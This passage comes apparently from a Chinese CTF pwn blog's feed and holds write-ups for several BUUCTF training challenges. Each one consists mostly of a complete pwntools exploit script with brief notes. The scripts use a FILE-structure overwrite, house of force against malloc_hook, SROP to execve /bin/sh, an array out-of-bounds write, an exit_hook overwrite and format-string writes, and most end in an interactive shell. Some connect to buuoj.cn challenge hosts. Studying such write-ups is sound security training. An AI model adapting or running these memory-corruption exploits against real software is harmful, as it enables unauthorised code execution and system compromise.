class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index, length, content</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>, <span class="string">&quot;2&quot;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>, <span class="built_in">str</span>(index))</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>, <span class="built_in">str</span>(length))</span><br><span class="line">    io.sendafter(<span class="string">&quot;&gt;&gt; &quot;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">new_x</span>(<span class="params">size</span>):</span><br><span class="line">    io.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit_x</span>(<span class="params">index, length, content</span>):</span><br><span class="line">    io.sendline(<span class="string">&quot;2&quot;</span>)</span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(length))</span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line">    io.send(content)</span><br><span class="line"></span><br><span class="line">new(<span class="number">0x200000</span>);</span><br><span class="line">edit(<span class="number">0</span>, <span class="number">0x201000</span> - <span class="number">0x10</span> + libc.sym[<span class="string">&#x27;_IO_2_1_stdout_&#x27;</span>] + <span class="number">0x10</span> + <span class="number">1</span>, <span class="string">&#x27;\n&#x27;</span>) <span class="comment"># _IO_read_end</span></span><br><span class="line">new_x(<span class="number">0x200000</span>);</span><br><span class="line">edit_x(<span class="number">1</span>, <span class="number">0x201000</span> * <span class="number">2</span> - <span class="number">0x10</span> + libc.sym[<span class="string">&#x27;_IO_2_1_stdout_&#x27;</span>] + <span class="number">0x20</span> + <span class="number">1</span>, <span class="string">&#x27;\n&#x27;</span>) <span class="comment"># _IO_write_base</span></span><br><span class="line">libc_base = u64(io.recvline()[<span class="number">8</span>:<span class="number">16</span>]) - libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>] + <span class="number">0x38</span> <span class="comment"># _IO_stdfile_2_lock (_IO_2_1_stderr_.file._lock)</span></span><br><span class="line">success(<span class="string">&quot;libc_base:\t&quot;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">5</span> + p64(<span class="number">1</span>) + p64(<span class="number">0</span>) + p64(libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>)))</span><br><span class="line">payload = payload.ljust(<span class="number">0xd8</span>, <span class="string">b&#x27;\x00&#x27;</span>) + p64(libc_base + get_IO_str_jumps() - <span class="number">8</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>) + p64(libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>])</span><br><span class="line">new(<span class="number">0x200000</span>);</span><br><span class="line">edit(<span class="number">2</span>, <span class="number">0x201000</span> * <span class="number">3</span> - <span class="number">0x10</span> + libc.sym[<span class="string">&#x27;_IO_2_1_stdin_&#x27;</span>] + <span class="number">0x38</span> + <span class="number">1</span>, payload) <span class="comment"># _IO_buf_base</span></span><br><span class="line"></span><br><span class="line">payload = p64(<span class="number">0xfbad208b</span>) <span class="comment"># _flags</span></span><br><span class="line">payload += p64(libc_base + libc.sym[<span class="string">&#x27;_IO_list_all&#x27;</span>] + <span class="number">132</span>) <span class="comment"># _IO_read_ptr</span></span><br><span class="line">payload += p64(libc_base + libc.sym[<span class="string">&#x27;_IO_list_all&#x27;</span>]) * <span class="number">6</span></span><br><span class="line">payload += p64(libc_base + libc.sym[<span class="string">&#x27;_IO_list_all&#x27;</span>] + <span class="number">0x10</span>) <span class="comment"># _IO_buf_end</span></span><br><span class="line">payload = payload.ljust(<span class="number">132</span>, <span class="string">b&#x27;\x00&#x27;</span>) + p64(libc_base - (<span class="number">0x201000</span> * <span class="number">3</span> - <span class="number">0x10</span>))</span><br><span class="line">io.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>, payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h2 id="参考"><a class="markdownIt-Anchor" href="#参考">#</a> 参考</h2><p><a href="https://qgieod1s9b.feishu.cn/docs/doccntELBOXQWXWrRgiWteZ0Xdh#">ctfshow 卷王杯官方 wp</a></p>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>gyctf_2020_force</title>
      <link href="/2022/02/27/gyctf_2020_force/"/>
      <url>/2022/02/27/gyctf_2020_force/</url>
      
        <content type="html"><![CDATA[<p>house of force,realloc 调整栈帧</p><span id="more"></span><h1 id="思路"><a class="markdownIt-Anchor" href="#思路">#</a> 思路</h1><p>house of force 改 top chunk，劫持 malloc_hook 为 one_gadget 拿 shell</p><h2 id="exp"><a class="markdownIt-Anchor" href="#exp">#</a> EXP</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># r = remote(&quot;node4.buuoj.cn&quot;, 26964)</span></span><br><span class="line">r = process(<span class="string">&quot;./gyctf_2020_force&quot;</span>)</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&quot;./gyctf_2020_force&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.23.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line">one_gadget_16 = [<span class="number">0x45216</span>,<span class="number">0x4526a</span>,<span class="number">0xf02a4</span>,<span class="number">0xf1147</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size, content</span>):</span><br><span class="line">r.recvuntil(<span class="string">&quot;2:puts\n&quot;</span>)</span><br><span class="line">r.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">r.recvuntil(<span class="string">&quot;size\n&quot;</span>)</span><br><span class="line">r.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">r.recvuntil(<span class="string">&quot;bin addr &quot;</span>)</span><br><span class="line">addr = <span class="built_in">int</span>(r.recvuntil(<span class="string">&#x27;\n&#x27;</span>).strip(), <span class="number">16</span>)</span><br><span class="line">r.recvuntil(<span class="string">&quot;content\n&quot;</span>)</span><br><span class="line">r.send(content)</span><br><span class="line"><span class="keyword">return</span> addr</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">r.recvuntil(<span class="string">&quot;2:puts\n&quot;</span>)</span><br><span class="line">r.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line"></span><br><span class="line">libc.address = add(<span class="number">0x200000</span>, <span class="string">&#x27;chunk0\n&#x27;</span>) + <span class="number">0x200ff0</span></span><br><span class="line">success(<span class="string">&#x27;libc_base&#x27;</span>+<span class="built_in">hex</span>(libc.address))</span><br><span class="line"></span><br><span class="line">heap_addr = add(<span class="number">0x18</span>, <span class="string">&#x27;a&#x27;</span>*<span class="number">0x10</span>+p64(<span class="number">0</span>)+p64(<span class="number">0xFFFFFFFFFFFFFFFF</span>))</span><br><span class="line">success(<span class="string">&quot;heap_addr:&quot;</span>+<span class="built_in">hex</span>(heap_addr))</span><br><span class="line"></span><br><span class="line">top = heap_addr + <span class="number">0x10</span></span><br><span class="line"><span class="comment"># gdb.attach(r)</span></span><br><span class="line"></span><br><span class="line">malloc_hook = libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">success(<span class="string">&quot;malloc_hook&quot;</span>+<span class="built_in">hex</span>(malloc_hook))</span><br><span class="line">one_gadget = one_gadget_16[<span class="number">1</span>] + libc.address</span><br><span class="line">realloc = libc.sym[<span class="string">&quot;__libc_realloc&quot;</span>]</span><br><span class="line">offset = malloc_hook - top</span><br><span class="line">system = libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">bin_sh = libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>).<span class="built_in">next</span>()</span><br><span class="line">success(<span class="string">&quot;system:&quot;</span> + <span class="built_in">hex</span>(system))</span><br><span class="line">success(<span class="string">&quot;bin_sh&quot;</span> + <span class="built_in">hex</span>(bin_sh))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(offset-<span class="number">0x30</span>, <span class="string">&#x27;aaa\n&#x27;</span>)</span><br><span class="line">add(<span class="number">0x10</span>, <span class="string">&#x27;a&#x27;</span>*<span class="number">8</span>+p64(one_gadget)+p64(realloc+<span class="number">0x10</span>))</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">&quot;2:puts\n&quot;</span>)</span><br><span class="line">r.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">r.recvuntil(<span class="string">&quot;size\n&quot;</span>)</span><br><span class="line">r.sendline(<span class="built_in">str</span>(<span class="number">20</span>))</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BUUCTF Pwn Exercise(一)</title>
      <link href="/2022/02/18/BUUCTF%20Pwn%20Exercise/"/>
      <url>/2022/02/18/BUUCTF%20Pwn%20Exercise/</url>
      
        <content type="html"><![CDATA[<p>BUUOJ PWN EXERCISE</p><span id="more"></span><h1 id="rootersctf_2019_sropsrop"><a class="markdownIt-Anchor" href="#rootersctf_2019_sropsrop">#</a> rootersctf_2019_srop(srop)</h1><h2 id="exp"><a class="markdownIt-Anchor" href="#exp">#</a> EXP</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">sh = process(<span class="string">&quot;rootersctf_2019_srop&quot;</span>)</span><br><span class="line">context.update(arch=<span class="string">&quot;amd64&quot;</span>, os=<span class="string">&quot;linux&quot;</span>, endian=<span class="string">&quot;little&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># write /bin/sh on 0x402000</span></span><br><span class="line">data_addr = <span class="number">0x402000</span></span><br><span class="line">syscall_leave_ret = <span class="number">0x401033</span></span><br><span class="line">pop_rax_syscall_leave_ret = <span class="number">0x401032</span></span><br><span class="line">syscall_addr = <span class="number">0x401046</span></span><br><span class="line">frame = SigreturnFrame(kernel=<span class="string">&quot;amd64&quot;</span>)</span><br><span class="line">frame.rax = <span class="number">0</span> <span class="comment"># read </span></span><br><span class="line">frame.rdi = <span class="number">0</span> <span class="comment"># stdin</span></span><br><span class="line">frame.rsi = data_addr</span><br><span class="line">frame.rdx = <span class="number">0x400</span></span><br><span class="line">frame.rip = syscall_leave_ret</span><br><span class="line">frame.rbp = data_addr + <span class="number">0x20</span></span><br><span class="line">layout = [<span class="number">0x88</span> * <span class="string">&quot;a&quot;</span>, pop_rax_syscall_leave_ret, <span class="number">0xf</span>, <span class="built_in">bytes</span>(frame)]</span><br><span class="line"><span class="comment"># srop to call read, set *data_addr = /bin/sh\x00</span></span><br><span class="line">sh.sendlineafter(<span class="string">&quot;Hey, can i get some feedback for the CTF?\n&quot;</span>, flat(layout))</span><br><span class="line"></span><br><span class="line"><span class="comment"># call execve /bin/sh</span></span><br><span class="line">layout = [<span class="string">&quot;/bin/sh\x00&quot;</span>, <span class="string">&quot;a&quot;</span> * <span class="number">0x20</span>, pop_rax_syscall_leave_ret, <span class="number">0xf</span>]</span><br><span class="line">frame = SigreturnFrame(kernel=<span class="string">&quot;amd64&quot;</span>)</span><br><span class="line">frame.rax = <span class="number">59</span> <span class="comment"># execve </span></span><br><span class="line">frame.rdi = data_addr <span class="comment"># stdin</span></span><br><span class="line">frame.rsi = <span class="number">0</span></span><br><span class="line">frame.rdx = <span class="number">0</span></span><br><span class="line">frame.rip = syscall_addr</span><br><span class="line">layout.append(<span class="built_in">bytes</span>(frame))</span><br><span class="line">sh.sendline(flat(layout))</span><br><span class="line">sh.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="参考文章"><a class="markdownIt-Anchor" href="#参考文章">#</a> 参考文章</h2><p><a href="https://blog.csdn.net/weixin_46521144/article/details/120714498">https://blog.csdn.net/weixin_46521144/article/details/120714498</a></p><p><a href="https://www.cnblogs.com/LynneHuan/p/14723605.html#exp">https://www.cnblogs.com/LynneHuan/p/14723605.html#exp</a></p><h1 id="qctf_2018_stack2数组越界"><a class="markdownIt-Anchor" href="#qctf_2018_stack2数组越界">#</a> qctf_2018_stack2（数组越界）</h1><h2 id="exp-2"><a class="markdownIt-Anchor" href="#exp-2">#</a> EXP</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python                         </span></span><br><span class="line"><span class="comment"># coding=utf-8                                </span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *                             </span><br><span class="line">context(log_level = <span class="string">&#x27;debug&#x27;</span>)                  </span><br><span class="line">                                              </span><br><span class="line">sh = remote(<span class="string">&quot;node3.buuoj.cn&quot;</span>,<span class="string">&quot;28924&quot;</span>)         </span><br><span class="line">                                              </span><br><span class="line">sh.sendlineafter(<span class="string">&#x27;have:\n&#x27;</span>,<span class="string">&#x27;0&#x27;</span>)               </span><br><span class="line">                                              </span><br><span class="line">sh.sendlineafter(<span class="string">&#x27;5. exit\n&#x27;</span>,<span class="string">&#x27;3&#x27;</span>)             </span><br><span class="line">sh.sendlineafter(<span class="string">&#x27;change:\n&#x27;</span>,<span class="built_in">str</span>(<span class="number">116</span> + <span class="number">0x10</span>))   </span><br><span class="line">sh.sendlineafter(<span class="string">&#x27;number:\n&#x27;</span>,<span class="built_in">str</span>(<span class="number">0x9b</span>))       </span><br><span class="line">                                              </span><br><span class="line">sh.sendlineafter(<span class="string">&#x27;5. exit\n&#x27;</span>,<span class="string">&#x27;3&#x27;</span>)             </span><br><span class="line">sh.sendlineafter(<span class="string">&#x27;change:\n&#x27;</span>,<span class="built_in">str</span>(<span class="number">117</span> + <span class="number">0x10</span>))   </span><br><span class="line">sh.sendlineafter(<span class="string">&#x27;number:\n&#x27;</span>,<span class="built_in">str</span>(<span class="number">0x85</span>))       </span><br><span class="line">                                              </span><br><span class="line">sh.sendlineafter(<span class="string">&#x27;5. exit\n&#x27;</span>,<span class="string">&#x27;3&#x27;</span>)             </span><br><span class="line">sh.sendlineafter(<span class="string">&#x27;change:\n&#x27;</span>,<span class="built_in">str</span>(<span class="number">118</span> + <span class="number">0x10</span>))   </span><br><span class="line">sh.sendlineafter(<span class="string">&#x27;number:\n&#x27;</span>,<span class="built_in">str</span>(<span class="number">0x04</span>))       </span><br><span class="line">                                              </span><br><span class="line">sh.sendlineafter(<span class="string">&#x27;5. exit\n&#x27;</span>,<span class="string">&#x27;3&#x27;</span>)             </span><br><span class="line">sh.sendlineafter(<span class="string">&#x27;change:\n&#x27;</span>,<span class="built_in">str</span>(<span class="number">119</span> + <span class="number">0x10</span>))   </span><br><span class="line">sh.sendlineafter(<span class="string">&#x27;number:\n&#x27;</span>,<span class="built_in">str</span>(<span class="number">0x08</span>))       </span><br><span class="line">                                              </span><br><span class="line">sh.sendlineafter(<span class="string">&#x27;5. exit\n&#x27;</span>,<span class="string">&#x27;5&#x27;</span>)             </span><br><span class="line">sh.interactive()                                </span><br></pre></td></tr></table></figure><h1 id="hfctf_2020_marksmanexit_hook"><a class="markdownIt-Anchor" href="#hfctf_2020_marksmanexit_hook">#</a> hfctf_2020_marksman(exit_hook)</h1><h2 id="exp-3"><a class="markdownIt-Anchor" href="#exp-3">#</a> EXP</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> functools</span><br><span class="line"></span><br><span class="line">LOG_ADDR = <span class="keyword">lambda</span> x, y: log.success(<span class="string">&#x27;&#123;&#125; ===&gt; &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(x, <span class="built_in">hex</span>(y)))</span><br><span class="line">int16 = functools.partial(<span class="built_in">int</span>, base=<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># sh = process(&quot;./hfctf_2020_marksman&quot;)</span></span><br><span class="line">sh = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">27982</span>)</span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">&quot;I placed the target near: &quot;</span>)</span><br><span class="line">msg = sh.recvline()</span><br><span class="line"></span><br><span class="line">puts_addr = int16(msg[:-<span class="number">1</span>].decode())</span><br><span class="line">LOG_ADDR(<span class="string">&quot;puts_addr&quot;</span>, puts_addr)</span><br><span class="line">libc_base_addr = puts_addr - <span class="number">0x809c0</span></span><br><span class="line">LOG_ADDR(<span class="string">&quot;libc_base_addr&quot;</span>, libc_base_addr)</span><br><span class="line"></span><br><span class="line">one_gadget1 = libc_base_addr + <span class="number">0x10a387</span></span><br><span class="line">__rtld_lock_unlock_recursive_offset = <span class="number">0x81df60</span></span><br><span class="line">target_addr = libc_base_addr + __rtld_lock_unlock_recursive_offset</span><br><span class="line"></span><br><span class="line"><span class="comment"># one_gadget1 = libc_base_addr + 0xe569f</span></span><br><span class="line"><span class="comment"># _dl_catch_error_offset = 0x5f4038</span></span><br><span class="line"><span class="comment"># target_addr = libc_base_addr + _dl_catch_error_offset</span></span><br><span class="line"></span><br><span class="line">sh.sendlineafter(<span class="string">&quot;shoot!shoot!\n&quot;</span>, <span class="built_in">str</span>(target_addr))</span><br><span class="line">input_gadget = one_gadget1</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">    sh.sendlineafter(<span class="string">&quot;biang!\n&quot;</span>, <span class="built_in">chr</span>(input_gadget &amp; <span class="number">0xff</span>))</span><br><span class="line">    input_gadget = input_gadget &gt;&gt; <span class="number">8</span></span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h2 id="参考文章-2"><a class="markdownIt-Anchor" href="#参考文章-2">#</a> 参考文章</h2><p><a href="http://kuanghy.github.io/2016/10/26/python-functools">Python 中的 functools</a></p><h1 id="picoctf_2018_echooo32位格式化字符串"><a class="markdownIt-Anchor" href="#picoctf_2018_echooo32位格式化字符串">#</a> picoctf_2018_echooo (32 位格式化字符串)</h1><h2 id="exp-4"><a class="markdownIt-Anchor" href="#exp-4">#</a> EXP</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#p=process(&#x27;./PicoCTF_2018_echooo&#x27;)</span></span><br><span class="line">p=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">28387</span>)</span><br><span class="line">offset=<span class="number">11</span></span><br><span class="line">flag=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">27</span>,<span class="number">27</span>+<span class="number">11</span>):</span><br><span class="line">    payload=<span class="string">&#x27;%&#123;&#125;$p&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">str</span>(i))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt; &#x27;</span>,payload)</span><br><span class="line">    aim=unhex(p.recvuntil(<span class="string">&#x27;\n&#x27;</span>,drop=<span class="literal">True</span>).replace(<span class="string">&#x27;0x&#x27;</span>,<span class="string">&#x27;&#x27;</span>))</span><br><span class="line">    flag+=aim[::-<span class="number">1</span>]</span><br><span class="line"><span class="built_in">print</span> flag</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="npuctf_2020_level2args上的格式化字符串漏洞"><a class="markdownIt-Anchor" href="#npuctf_2020_level2args上的格式化字符串漏洞">#</a> npuctf_2020_level2 (args 上的格式化字符串漏洞)</h1><h2 id="程序分析"><a class="markdownIt-Anchor" href="#程序分析">#</a> 程序分析</h2><p><img src="https://raw.githubusercontent.com/y1seco/blog_image/master/img/202202021650076.png" alt="image-20220202165015889"></p><h2 id="漏洞利用"><a class="markdownIt-Anchor" href="#漏洞利用">#</a> 漏洞利用</h2><p><img src="https://raw.githubusercontent.com/y1seco/blog_image/master/img/202202021659073.png" alt="image-20220202165914998"></p><p>漏洞点为 printf 格式化字符串部分，但 buf 在 bss 段不在栈上因而不能通过填地址来写入，需要借助地址链分批次写入</p><h2 id="exp-5"><a class="markdownIt-Anchor" href="#exp-5">#</a> EXP</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> functools</span><br><span class="line"></span><br><span class="line">LOG_ADDR = <span class="keyword">lambda</span> x, y: log.success(<span class="string">&#x27;&#123;&#125; ===&gt; &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(x, <span class="built_in">hex</span>(y)))</span><br><span class="line">int16 = functools.partial(<span class="built_in">int</span>, base=<span class="number">16</span>)</span><br><span class="line">context.update(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, endian=<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># sh = process(&#x27;./npuctf_2020_level2&#x27;)</span></span><br><span class="line">sh = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">27290</span>)</span><br><span class="line"></span><br><span class="line">sh.sendline(<span class="string">&quot;%9$p,%24$p&quot;</span>)</span><br><span class="line">msg = sh.recvline()</span><br><span class="line">stack_addr, libc_addr = msg[:-<span class="number">1</span>].split(<span class="string">b&#x27;,&#x27;</span>)</span><br><span class="line"></span><br><span class="line">stack_addr = int16(stack_addr.decode())</span><br><span class="line">libc_addr = int16(libc_addr.decode())</span><br><span class="line">LOG_ADDR(<span class="string">&#x27;stack_addr&#x27;</span>, stack_addr)</span><br><span class="line">LOG_ADDR(<span class="string">&#x27;libc_addr&#x27;</span>, libc_addr)</span><br><span class="line"></span><br><span class="line">stack_ret_addr = stack_addr - <span class="number">0xe0</span></span><br><span class="line">libc_base_addr = libc_addr - <span class="number">0x3e7638</span></span><br><span class="line"></span><br><span class="line">LOG_ADDR(<span class="string">&#x27;stack_ret_addr&#x27;</span>, stack_ret_addr)</span><br><span class="line">LOG_ADDR(<span class="string">&#x27;libc_base_addr&#x27;</span>, libc_base_addr)</span><br><span class="line"></span><br><span class="line">gadgets = [<span class="number">0x4f2c5</span>, <span class="number">0x4f322</span>, <span class="number">0x10a38c</span>]</span><br><span class="line">one_gadget = libc_base_addr + gadgets[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">LOG_ADDR(<span class="string">&#x27;one_gadget&#x27;</span>, one_gadget)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;%&#123;&#125;c%9$hn&quot;</span>.<span class="built_in">format</span>((stack_ret_addr &amp; <span class="number">0xffff</span>))</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.recv()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>):</span><br><span class="line">    sh.sendline(<span class="string">&#x27;a&#x27;</span> * <span class="number">0x30</span>)</span><br><span class="line">    sh.recv()</span><br><span class="line">    sleep(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;%&#123;&#125;c%35$hn&quot;</span>.<span class="built_in">format</span>((one_gadget &amp; <span class="number">0xffff</span>)) + <span class="string">&#x27;a&#x27;</span> * <span class="number">0x10</span></span><br><span 